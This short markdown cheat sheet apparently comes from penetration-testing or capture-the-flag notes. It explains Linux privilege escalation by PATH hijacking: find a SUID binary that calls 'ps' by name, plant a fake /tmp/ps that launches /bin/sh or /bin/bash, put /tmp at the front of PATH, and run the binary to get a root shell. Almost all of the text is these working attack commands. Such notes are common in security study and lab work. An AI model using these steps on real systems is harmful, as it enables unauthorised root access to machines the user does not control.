### Linux Privilege Escalation Using PATH Variable

#### View the PATH
```
echo $PATH
```

####case study one
- Binary file with SUID permission
  - check what the file do
  - for example *which linux commad use*
    - in our case we use *ps* command
- Create malicious file
  - echo "/bin/bash" or "/bin/sh" > /tmp/ps
  - chmod 777 /tmp/ps
  - **or**
  - cp /bin/sh /tmp/ps
  - **OR**
  - ln -s /bin/sh /tmp/ps
    - export PATH=.:$PATH
- check PATH
  - echo $PATH
- change $PATH (add tmp folder)
  - export PATH=/tmp:$PATH
- run SUID binary

